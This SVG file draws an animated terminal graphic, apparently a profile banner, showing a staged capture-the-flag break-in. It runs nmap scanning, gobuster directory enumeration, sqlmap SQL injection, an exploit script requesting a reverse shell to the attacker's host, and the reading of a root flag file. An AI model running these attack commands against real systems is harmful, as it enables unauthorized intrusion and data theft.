<svg width="640" height="540" viewBox="0 0 640 540" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <clipPath id="card"><rect width="640" height="540" rx="10"/></clipPath>
    <filter id="glow" x="-50%" y="-50%" width="200%" height="200%">
      <feGaussianBlur stdDeviation="2.4" result="b"/>
      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>

  <g clip-path="url(#card)">
    <rect width="640" height="540" fill="#0b0e14"/>
    <rect width="640" height="34" fill="#161b22"/>
    <circle cx="20" cy="17" r="6" fill="#ff5f56"/>
    <circle cx="42" cy="17" r="6" fill="#ffbd2e"/>
    <circle cx="64" cy="17" r="6" fill="#27c93f"/>
    <text x="320" y="22" text-anchor="middle" font-family="monospace" font-size="12" fill="#8b949e">kwonfig — kali :: pentest.sh</text>

    <g font-family="monospace" font-size="13.5">

      <text x="20" y="65" opacity="0"><animate attributeName="opacity" to="1" begin="0.2s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# nmap -sV -sC -T4 192.168.0.101</tspan></text>

      <text x="20" y="87" fill="#6c7a89" opacity="0"><animate attributeName="opacity" to="1" begin="0.38s" dur="0.1s" fill="freeze"/>PORT     STATE  SERVICE     VERSION</text>

      <text x="20" y="107" opacity="0"><animate attributeName="opacity" to="1" begin="0.5s" dur="0.1s" fill="freeze"/>
        <tspan fill="#e6edf3">22/tcp   </tspan><tspan fill="#00ff41">open</tspan><tspan fill="#e6edf3">   ssh         </tspan><tspan fill="#39c5ff">OpenSSH 8.2p1</tspan></text>

      <text x="20" y="127" opacity="0"><animate attributeName="opacity" to="1" begin="0.62s" dur="0.1s" fill="freeze"/>
        <tspan fill="#e6edf3">80/tcp   </tspan><tspan fill="#00ff41">open</tspan><tspan fill="#e6edf3">   http        </tspan><tspan fill="#39c5ff">Apache 2.4.41</tspan></text>

      <text x="20" y="147" opacity="0"><animate attributeName="opacity" to="1" begin="0.74s" dur="0.1s" fill="freeze"/>
        <tspan fill="#e6edf3">443/tcp  </tspan><tspan fill="#00ff41">open</tspan><tspan fill="#e6edf3">   ssl/http    </tspan><tspan fill="#39c5ff">nginx 1.18.0</tspan></text>

      <text x="20" y="175" opacity="0"><animate attributeName="opacity" to="1" begin="1.05s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# gobuster dir -u http://192.168.0.101 -w common.txt</tspan></text>

      <text x="20" y="196" opacity="0"><animate attributeName="opacity" to="1" begin="1.2s" dur="0.1s" fill="freeze"/>
        <tspan fill="#6c7a89">/admin        </tspan><tspan fill="#ffbd2e">(Status: 200)</tspan></text>

      <text x="20" y="216" opacity="0"><animate attributeName="opacity" to="1" begin="1.32s" dur="0.1s" fill="freeze"/>
        <tspan fill="#6c7a89">/login        </tspan><tspan fill="#ffbd2e">(Status: 200)</tspan></text>

      <text x="20" y="236" opacity="0"><animate attributeName="opacity" to="1" begin="1.44s" dur="0.1s" fill="freeze"/>
        <tspan fill="#6c7a89">/uploads      </tspan><tspan fill="#ffbd2e">(Status: 301)</tspan></text>

      <text x="20" y="264" opacity="0"><animate attributeName="opacity" to="1" begin="1.75s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# sqlmap -u "192.168.0.101/login.php?id=1" --batch --dbs</tspan></text>

      <text x="20" y="285" fill="#6c7a89" opacity="0"><animate attributeName="opacity" to="1" begin="1.9s" dur="0.1s" fill="freeze"/>[INFO] testing connection to target URL</text>

      <text x="20" y="305" fill="#ff5f56" opacity="0"><animate attributeName="opacity" to="1" begin="2.02s" dur="0.1s" fill="freeze"/>[WARNING] parameter 'id' is injectable (boolean-based)</text>

      <text x="20" y="325" fill="#00ff41" opacity="0"><animate attributeName="opacity" to="1" begin="2.14s" dur="0.1s" fill="freeze"/>available databases [2]: users, admin_db</text>

      <text x="20" y="353" opacity="0"><animate attributeName="opacity" to="1" begin="2.45s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# python3 exploit.py --target 192.168.0.101 --lhost 192.168.0.5</tspan></text>

      <text x="20" y="374" fill="#6c7a89" opacity="0"><animate attributeName="opacity" to="1" begin="2.6s" dur="0.1s" fill="freeze"/>[*] sending payload... reverse shell requested</text>

      <text x="20" y="394" fill="#00ff41" opacity="0"><animate attributeName="opacity" to="1" begin="2.72s" dur="0.1s" fill="freeze"/>[+] connection established — shell obtained</text>

      <text x="20" y="422" opacity="0"><animate attributeName="opacity" to="1" begin="3.03s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# whoami</tspan></text>

      <text x="20" y="443" fill="#00ff41" opacity="0"><animate attributeName="opacity" to="1" begin="3.18s" dur="0.1s" fill="freeze"/>root</text>

      <text x="20" y="471" opacity="0"><animate attributeName="opacity" to="1" begin="3.5s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# cat /root/flag.txt</tspan></text>

      <text x="20" y="496" font-size="15" font-weight="bold" fill="#ffd23f" filter="url(#glow)" opacity="0"><animate attributeName="opacity" to="1" begin="3.68s" dur="0.15s" fill="freeze"/>flag{pwn3d_by_kwonfig}</text>

      <text x="20" y="524" textLength="105" lengthAdjust="spacingAndGlyphs" opacity="0"><animate attributeName="opacity" to="1" begin="3.95s" dur="0.1s" fill="freeze"/>
        <tspan fill="#00ff41">root@kali</tspan><tspan fill="#e6edf3">:~# </tspan></text>

      <rect x="125" y="511" width="9" height="17" fill="#00ff41" opacity="0">
        <animate attributeName="opacity" values="0;1;1;0;1" keyTimes="0;0.001;0.5;0.51;1" dur="1s" begin="4.1s" repeatCount="indefinite"/>
      </rect>
    </g>
  </g>

  <rect width="640" height="540" rx="10" fill="none" stroke="#30363d" stroke-width="1"/>
</svg>
